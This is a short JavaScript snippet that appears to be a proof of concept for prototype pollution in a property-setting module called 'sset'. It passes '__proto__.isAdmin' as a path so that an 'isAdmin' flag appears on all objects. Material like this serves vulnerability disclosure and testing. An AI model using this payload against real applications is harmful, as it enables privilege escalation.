const sset = require('./main');
var obj = {}  
console.log("Before : " + obj.isAdmin);
sset(obj, '__proto__.isAdmin', true);
console.log("After : " + obj.isAdmin);